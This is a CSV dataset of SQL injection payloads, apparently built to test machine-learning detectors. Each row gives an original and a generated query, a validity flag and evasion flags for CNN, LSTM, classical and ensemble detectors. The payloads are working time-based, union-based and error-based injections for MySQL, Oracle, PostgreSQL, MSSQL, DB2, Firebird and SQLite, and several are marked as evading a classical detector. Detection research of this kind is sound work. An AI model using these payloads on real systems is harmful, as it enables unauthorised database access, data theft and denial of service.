,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
12,"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#","1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",1,1,0,0,0,0,0
13,1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,1,1,0,0,0,0,0
14,"1%"");select benchmark(5000000,md5(0x714e4153))#","1%"");select benchmark(5000000,md5(0x714e4153))#",1,1,0,0,1,0,0
15,"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,1,0,0,0,0,0
16,"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""","1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",1,1,0,0,0,0,0
17,"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--","-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",1,1,0,0,0,0,0
18,"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi","1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",1,1,0,0,0,0,0
19,-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,1,1,0,0,0,0,0
20,"-2583"") where 3455=3455 or make_set(9354=9354,7185)--","-2583"") where 3455=3455 or make_set(9354=9354,7185)--",1,1,0,0,0,0,0
21,"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws","-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",1,1,0,0,0,0,0
22,"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,1,0,0,0,0,0
23,"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
24,"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#","-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",1,1,0,0,0,0,0
25,1'+(select 'gmpn' where 8137=8137 or sleep(5))+',1'+(select 'gmpn' where 8137=8137 or sleep(5))+',1,1,0,0,0,0,0
26,"-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#","-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#",1,1,0,0,0,0,0
27,"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
28,1' where 8584=8584 order by 1#,1' where 8584=8584 order by 1#,1,1,0,0,0,0,0
29,"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)","1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1,1,0,0,0,0,0
30,1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1,1,0,0,0,0,0
31,1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#,1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#,1,1,0,0,0,0,0
32,"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs","1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",1,1,0,0,0,0,0
33,"1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'","1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",1,1,0,0,0,0,0
34,"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,1,0,0,0,0,0
35,"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""","1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",1,1,0,0,0,0,0
36,1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),0,1,0,0,0,0,0
37,"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw","1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw",1,1,0,0,0,0,0
38,"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='","1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='",1,1,0,0,0,0,0
39,1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge,1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge,1,1,0,0,0,0,0
40,"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",1,1,0,0,0,0,0
41,"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz","1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz",1,1,0,0,1,0,0
42,"1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--","1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1,1,0,0,0,0,0
43,"1%"")) order by 1#","1%"")) order by 1#",1,1,0,0,0,0,0
44,1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1,1,0,0,0,0,0
45,-6165%')) union all select 5384#,-6165%')) union all select 5384#,1,1,0,0,0,0,0
46,"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",1,1,0,0,0,0,0
47,"1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",0,1,0,0,0,0,0
48,"-2122"") as zytb where 7025=7025 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","-2122"") as zytb where 7025=7025 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1,1,0,0,0,0,0
49,"1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--","1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--",1,1,0,0,0,0,0
50,1) as imdt where 6431=6431;begin user_lock.sleep(5); end--,1) as imdt where 6431=6431;begin user_lock.sleep(5); end--,0,1,0,0,0,0,0
51,1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,1,1,0,0,0,0,0
52,1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518,1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518,1,1,0,0,0,0,0
53,1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--,1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--,1,1,0,0,0,0,0
54,"1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--","1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1,1,0,0,0,0,0
55,"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""","1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""",1,1,0,0,0,0,0
56,"-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--","-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--",1,1,0,0,0,0,0
57,"-6108') union all select 2519,2519,2519,2519--","-6108') union all select 2519,2519,2519,2519--",1,1,0,0,0,0,0
58,1) where 3979=3979 rlike sleep(5)--,1) where 3979=3979 rlike sleep(5)--,0,1,0,0,0,0,0
59,-8143) union all select 3014--,-8143) union all select 3014--,1,1,0,0,0,0,0
60,"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi","-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi",1,1,0,0,0,0,0
61,1') where 6624=6624 and 5392=8258,1') where 6624=6624 and 5392=8258,1,1,0,0,0,0,0
62,"-3884"" where 8012=8012 union all select 8012,8012#","-3884"" where 8012=8012 union all select 8012,8012#",1,1,0,0,0,0,0
63,"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""","1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""",1,1,0,0,0,0,0
64,"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,1,0,0,0,0,0
65,"1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--","1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",1,1,0,0,0,0,0
66,"1) where 9371=9371 union all select null,null,null,null,null,null,null--","1) where 9371=9371 union all select null,null,null,null,null,null,null--",1,1,0,0,0,0,0
67,"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,1,0,0,0,0,0
68,"1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,1,0,0,0,0,0
69,"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--","1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--",1,1,0,0,0,0,0
70,-9336' or 5641=9488#,-9336' or 5641=9488#,1,1,0,0,0,0,0
71,"-3205"") union all select 5233,5233,5233,5233#","-3205"") union all select 5233,5233,5233,5233#",1,1,0,0,0,0,0
72,1') rlike (select * from (select(sleep(5)))vwyq)#,1') rlike (select * from (select(sleep(5)))vwyq)#,1,1,0,0,1,0,0
73,"1"") where 7548=7548;select sleep(5)--","1"") where 7548=7548;select sleep(5)--",1,1,0,0,0,0,0
74,1';(select * from (select(sleep(5)))srmq),1';(select * from (select(sleep(5)))srmq),1,1,0,0,1,0,0
75,1'));select case when 2095=9074 then 1 else null end--,1'));select case when 2095=9074 then 1 else null end--,1,1,0,0,0,0,0
76,"1%"")) rlike (select * from (select(sleep(5)))vwyq)#","1%"")) rlike (select * from (select(sleep(5)))vwyq)#",1,1,0,0,1,0,0
77,1' where 4134=4134 and 1102=6300--,1' where 4134=4134 and 1102=6300--,1,1,0,0,0,0,0
78,"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn","1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn",1,1,0,0,0,0,0
79,"-5800"") or 6872=6872 and (""tcab"" like ""tcab","-5800"") or 6872=6872 and (""tcab"" like ""tcab",1,1,0,0,0,0,0
80,"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--","-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",1,1,0,0,0,0,0
81,"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))","(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",0,1,0,0,0,0,0
82,'1,'1,1,1,1,0,0,0,0
83,"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",1,1,0,0,0,0,0
84,"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#","1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#",1,1,0,0,0,0,0
85,"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf","1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf",1,1,0,0,0,0,0
86,"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw","1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw",1,1,0,0,0,0,0
87,1 where 2382=2382;(select * from (select(sleep(5)))acdk)#,1 where 2382=2382;(select * from (select(sleep(5)))acdk)#,1,1,0,0,1,0,0
88,"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja","1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",1,1,0,0,0,0,0
89,"1%"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""","1%"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",1,1,0,0,0,0,0
90,1'||(select 'puco' where 2605=2605 union all select null#,1'||(select 'puco' where 2605=2605 union all select null#,1,1,0,0,0,0,0
91,1%')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',1%')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',1,1,0,0,0,0,0
92,"make_set(5679=9769,9769)","make_set(5679=9769,9769)",0,1,0,0,0,0,0
93,"1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--","1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--",1,1,0,0,0,0,0
94,"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje","1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje",1,1,0,0,0,0,0
95,1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,1,1,0,0,0,0,0
96,"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,1,0,0,0,0,0
97,"-1197"")) as dfsy where 8857=8857 or 3038=3038","-1197"")) as dfsy where 8857=8857 or 3038=3038",1,1,0,0,0,0,0
98,"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='","1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",1,1,0,0,0,0,0
99,"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",1,1,0,0,0,0,0
100,"1')) union all select null,null,null,null,null--","1')) union all select null,null,null,null,null--",1,1,0,0,0,0,0
101,1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',1,1,0,0,0,0,0
102,1))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((4694=4694,1))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((4694=4694,1,1,0,0,0,0,0
103,"1"") where 5197=5197 and elt(3114=3114,sleep(5))#","1"") where 5197=5197 and elt(3114=3114,sleep(5))#",1,1,0,0,0,0,0
104,"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'","1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",1,1,0,0,0,0,0
105,1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1,1,0,0,0,0,0
106,"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""","1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",1,1,0,0,0,0,0
107,"1;select count(*) from generate_series(1,5000000)-- gqkk","1;select count(*) from generate_series(1,5000000)-- gqkk",1,1,0,0,0,0,0
108,"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'","1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",1,1,0,0,0,0,0
109,-3938%'))) or 2034=7209#,-3938%'))) or 2034=7209#,1,1,0,0,0,0,0
110,"1%')) union all select null,null,null#","1%')) union all select null,null,null#",1,1,0,0,0,0,0
111,1) where 5866=5866 and 4595=4595#,1) where 5866=5866 and 4595=4595#,0,1,0,0,0,0,0
112,1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,1,1,0,0,1,0,0
113,"1',(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))","1',(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))",1,1,0,0,0,0,0
114,-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,1,1,0,0,0,0,0
115,1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,1,1,0,0,1,0,0
